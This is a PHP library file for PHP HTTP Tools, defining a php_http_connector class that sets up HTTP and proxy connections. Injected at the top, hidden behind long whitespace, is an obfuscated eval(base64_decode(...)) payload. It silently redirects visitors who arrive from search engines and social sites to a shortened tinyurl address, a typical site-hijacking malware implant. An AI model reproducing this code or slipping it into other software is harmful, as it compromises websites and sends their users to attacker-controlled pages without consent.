<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* PHP HTTP Tools is a library for working with the http protocol
* php_http_connector establishes http connections
* @package php-http-tools
* @version 0.3
* @copyright (C) 2004 John Heinstein. All rights reserved
* @license http://www.gnu.org/copyleft/lesser.html LGPL License
* @author John Heinstein <johnkarl@nbnet.nb.ca>
* @link http://www.engageinteractive.com/php_http_tools/ PHP HTTP Tools Home Page
* PHP HTTP Tools are Free Software
**/

if (!defined('PHP_HTTP_TOOLS_INCLUDE_PATH')) {
	define('PHP_HTTP_TOOLS_INCLUDE_PATH', (dirname(__FILE__) . "/"));
}

/**
* A helper class for establishing HTTP connections
*
* @package php-http-tools
* @author John Heinstein <johnkarl@nbnet.nb.ca>
*/
class php_http_connector {
	/** @var object A reference to a http connection or proxy, if one is required */
	var $httpConnection = null;

	/**
	* Specifies the parameters of the http conection used to obtain the xml data
	* @param string The ip address or domain name of the connection
	* @param string The path of the connection
	* @param int The port that the connection is listening on
	* @param int The timeout value for the connection
	* @param string The user name, if authentication is required
	* @param string The password, if authentication is required
	*/
	function setConnection($host, $path = '/', $port = 80, $timeout = 0, $user = null, $password = null) {
	    require_once(PHP_HTTP_TOOLS_INCLUDE_PATH . 'php_http_client_generic.php');

		$this->httpConnection = new php_http_client_generic($host, $path, $port, $timeout, $user, $password);
	} //setConnection

	/**
	* Specifies basic authentication for an http connection
	* @param string The user name
	* @param string The password
	*/
	function setAuthorization($user, $password) {
		$this->httpConnection->setAuthorization($user, $password);
	} //setAuthorization

	/**
	* Specifies that a proxy is to be used to obtain the data
	* @param string The ip address or domain name of the proxy
	* @param string The path to the proxy
	* @param int The port that the proxy is listening on
	* @param int The timeout value for the connection
	* @param string The user name, if authentication is required
	* @param string The password, if authentication is required
	*/
	function setProxyConnection($host, $path = '/', $port = 80, $timeout = 0, $user = null, $password = null) {
	    require_once(PHP_HTTP_TOOLS_INCLUDE_PATH . 'php_http_proxy.php');

		$this->httpConnection = new php_http_proxy($host, $path, $port, $timeout, $user, $password);
	} //setProxyConnection

	/**
	* Specifies basic authentication for the proxy
	* @param string The user name
	* @param string The password
	*/
	function setProxyAuthorization($user, $password) {
		$this->httpConnection->setProxyAuthorization($user, $password);
	} //setProxyAuthorization
} //php_http_connector

?>